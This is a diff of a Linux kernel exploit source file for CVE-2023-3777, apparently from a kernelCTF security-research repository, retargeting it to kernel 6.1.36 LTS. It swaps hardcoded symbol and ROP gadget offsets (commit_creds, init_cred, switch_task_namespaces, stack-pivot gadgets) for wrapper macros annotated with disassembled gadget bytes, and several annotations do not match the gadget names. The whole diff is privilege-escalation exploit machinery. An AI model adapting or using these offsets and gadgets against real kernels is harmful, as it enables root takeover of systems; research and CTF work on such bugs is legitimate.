--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit_original.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit_original.c
@@ -33,13 +33,13 @@
 // uint64_t nft_counter_ops_off = 0x1b26680;
 
 // new offsets
-uint64_t find_task_by_vpid_off = 0xbb6f0;
-uint64_t switch_task_namespaces_off = 0xc3380;
-uint64_t commit_creds_off = 0xc4f20;
-uint64_t init_nsproxy_off = 0x1861380;
-uint64_t init_cred_off = 0x18615c0;
-uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0xc01090;
-uint64_t nft_counter_ops_off = 0x10c6700;
+uint64_t find_task_by_vpid_off = __kexploit_rop_offset(0xbb6f0, "add byte ptr [rax], al; xor ecx, ecx; mov rdi, rbx; mov rsi, qword ptr [rbx + 0x1f28]; mov word ptr [rbx + 0x20ca], ax; mov rdx, qword ptr [rbx + 0x1f30]; shr rsi, 0xc; call 0xffffffff8102dd10; mov rdi, qword ptr [rbx]; lea rsi, [rbx + 0x410]; mov rdx, 0xffffffffffffffff; call 0xffffffff8107c270; mov qword ptr [rbx + 0x1f28], 0xffffffffffffffff; mov rdx, qword ptr [rbx + 0x1f30]; mov rdi, qword ptr [rbx]; mov ecx, 0x1000; mov rsi, rbp; call 0xffffffff81029450; test eax, eax; jne 0xffffffff810bb7bf; mov rsi, qword ptr [rsp + 8]; mov rdi, rbx; call 0xffffffff810aac50; mov rdi, rbx; call 0xffffffff8108f360; mov rdi, rbx; and rax, 0xfffffffffffff72a; mov rsi, rax; call 0xffffffff8109c700; mov rdi, rbx; call 0xffffffff81048a00; jmp 0xffffffff810bb78e");
+uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0xc3380);
+uint64_t commit_creds_off = __kexploit_rop_offset(0xc4f20, "add byte ptr [rax], al; add byte ptr [rax], al; add dh, dh; xor eax, 1; add byte ptr [rax], al; and byte ptr [rdi], cl; test ebp, ebx");
+uint64_t init_nsproxy_off = __kexploit_kernel_offset(0x1861380);
+uint64_t init_cred_off = __kexploit_kernel_offset(0x18615c0);
+uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_rop_offset(0xc01090, "call 0xffffffff81bf4970; xor esi, esi; mov edx, 0xf4; mov rdi, r15; call 0xffffffff81bf4970; test eax, eax; jne 0xffffffff8212c911; mov rdi, r15; call 0xffffffff81c001a0; mov rdi, r15; call 0xffffffff81bfee20; mov rdi, qword ptr [r15 + 0x58]; call 0xffffffff81bf70a0; test eax, eax; jne 0xffffffff81c010de; mov rdi, rbx; call 0xffffffff81bf9c90; jmp 0xffffffff81c00fed");
+uint64_t nft_counter_ops_off = __kexploit_rop_offset(0x10c6700, "and al, 0x10; mov qword ptr [rsp + 0x18], r13; mov qword ptr [rsp + 0x20], r15; mov eax, 0xffffffff; xor r9d, r9d; mov ecx, edx; cmp ecx, 8; jb 0xffffffff820c6852; test sil, 7; jne 0xffffffff820c6857; mov r12d, ecx; shr r12, 6; je 0xffffffff820c67ad; clc ; nop word ptr cs:[rax + rax]; nop ; mov rbx, qword ptr [rdi]; mov r8, qword ptr [rdi + 8]; mov r11, qword ptr [rdi + 0x10]; mov rdx, qword ptr [rdi + 0x18]; mov r10, qword ptr [rdi + 0x20]; mov r15, qword ptr [rdi + 0x28]; mov r14, qword ptr [rdi + 0x30]; mov r13, qword ptr [rdi + 0x38]; prefetcht0 byte ptr [rdi + 0x140]; adc rax, rbx; adc rax, r8; adc rax, r11; adc rax, rdx; adc rax, r10; adc rax, r15; adc rax, r14; adc rax, r13; dec r12d; mov qword ptr [rsi], rbx; mov qword ptr [rsi + 8], r8; mov qword ptr [rsi + 0x10], r11; mov qword ptr [rsi + 0x18], rdx; mov qword ptr [rsi + 0x20], r10; mov qword ptr [rsi + 0x28], r15; mov qword ptr [rsi + 0x30], r14; mov qword ptr [rsi + 0x38], r13; lea rdi, [rdi + 0x40]; lea rsi, [rsi + 0x40]; jne 0xffffffff820c6740; adc rax, r9; mov r10, rcx; and ecx, 0x3f; shr ecx, 3; je 0xffffffff820c67d8; clc ; nop dword ptr [rax]; mov rbx, qword ptr [rdi]; adc rax, rbx; dec ecx; mov qword ptr [rsi], rbx; lea rsi, [rsi + 8]; lea rdi, [rdi + 8]; jne 0xffffffff820c67c0; adc rax, r9; mov ebx, eax; shr rax, 0x20; add eax, ebx; adc eax, r9d; mov ecx, r10d; and ecx, 7; shr ecx, 1; je 0xffffffff820c6817; mov edx, 2; xor ebx, ebx; clc ; nop word ptr cs:[rax + rax]");
 // these ones were with nftables module
 // uint64_t find_task_by_vpid_off = 0xbb6f0;
 // uint64_t switch_task_namespaces_off = 0xc3380;
@@ -62,14 +62,14 @@
 // 0xffffffff81068961 : pop rsp ; jmp 0xffffffff82404b80
 
 // new offsets
-uint64_t push_rbx_pop_rsp = 0xf5b269; // TODO
-uint64_t pop_rdi_ret = 0x10dc4b;
-uint64_t pop_rsi_ret = 0x360de;
-uint64_t mov_rdi_rax_ret = 0x1142a6b; // TODO
-uint64_t add_rax_rsi_ret = 0x036590; // TODO
-uint64_t pop_rcx_ret = 0x10d429;
-uint64_t mov_rax_rcx_ret = 0x72342b; // TODO
-uint64_t pop_rsp_ret = 0x282a0;
+uint64_t push_rbx_pop_rsp = __kexploit_rop_offset(0xf5b269, "push rbx; and byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; jmp 0xffffffff82404b80"); // TODO
+uint64_t pop_rdi_ret = __kexploit_rop_offset(0x10dc4b, "mov rdi, rax; call 0xffffffff820bbf00; test eax, eax; jne 0xffffffff8110dc29; mov edx, 0xa; xor esi, esi; lea rdi, [rbp + 9]; call 0xffffffff820bda60; mov edx, dword ptr [rbx + 0xc]; cmp rdx, rax; sete al; movzx eax, al; jmp 0xffffffff8110dc2b");
+uint64_t pop_rsi_ret = __kexploit_rop_offset(0x360de, "ret ");
+uint64_t mov_rdi_rax_ret = __kexploit_rop_offset(0x1142a6b, "mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; jmp 0xffffffff82404b80"); // TODO
+uint64_t add_rax_rsi_ret = __kexploit_rop_offset(0x36590, "add rax, rsi; jmp 0xffffffff82404b80"); // TODO
+uint64_t pop_rcx_ret = __kexploit_rop_offset(0x10d429, "pop rsp; jmp 0xffffffff821527c0");
+uint64_t mov_rax_rcx_ret = __kexploit_rop_offset(0x72342b, "mov qword ptr [rax], rcx; jmp 0xffffffff82404b80"); // TODO
+uint64_t pop_rsp_ret = __kexploit_rop_offset(0x282a0, "adc byte ptr [rax - 0x16], r15b; jmp 0xffffffff8102825a");
 
 // uint64_t push_rbx_pop_rsp = 0xf5b269;
 // uint64_t pop_rdi_ret = 0x088893;
@@ -868,3 +868,5 @@
     return 0;
 }
 
+__kexploit_src_metadata("{\"kernel_name\": \"kernelctf_6.1.36_lts\"}")
+
